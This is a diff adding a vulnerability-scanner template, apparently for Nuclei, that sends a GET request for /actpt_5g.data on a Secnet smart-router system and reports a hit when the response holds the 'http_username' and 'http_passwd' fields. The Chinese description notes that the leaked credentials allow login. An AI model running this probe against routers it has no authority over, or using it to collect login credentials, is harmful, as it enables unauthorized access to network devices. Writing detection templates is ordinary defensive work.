@@ -1,0 +1,26 @@
+id: Secnet-Information-disclosure
+
+info:
+  tags: Secnet-Information-disclosure
+  name: Secnet-智能路由系统 actpt_5g.data信息泄露
+  author: xc
+  severity: medium
+  description: Secnet-智能路由系统actpt_5g.data信息泄露，攻击者可利用泄露的账号密码登录系统
+  
+http:
+  - raw:
+      - |
+        GET /actpt_5g.data HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "http_username"
+          - "http_passwd"
+        condition: and
+      - type: status
+        status: 
+          - 200
